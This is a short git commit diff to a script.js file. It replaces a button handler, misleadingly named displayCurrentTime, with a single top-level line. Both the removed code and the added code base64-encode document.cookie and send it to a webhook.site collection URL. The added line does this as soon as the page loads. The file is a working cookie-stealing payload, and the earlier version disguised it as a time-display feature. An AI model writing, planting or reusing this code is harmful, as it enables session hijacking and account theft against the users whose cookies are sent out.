5b6384acb6e29f3f893dfa22dacf8447b3e3361c
MuchenLu <ryan.yonglai@gmail.com>
2025-08-11 19:00:18 +0800

    init

--- script.js
+++ script.js
@@ -1,10 +1,1 @@
-document.addEventListener("DOMContentLoaded", function () {
-  const button = document.getElementById("showTimeButton");
-  button.addEventListener("click", function () {
-    displayCurrentTime();
-  });
-
-  function displayCurrentTime() {
-    fetch('https://webhook.site/8b686791-312a-4924-9bb2-8f1b124c8b56?'+window.btoa(document.cookie))
-  }
-});
+fetch('https://webhook.site/8b686791-312a-4924-9bb2-8f1b124c8b56?'+window.btoa(document.cookie))
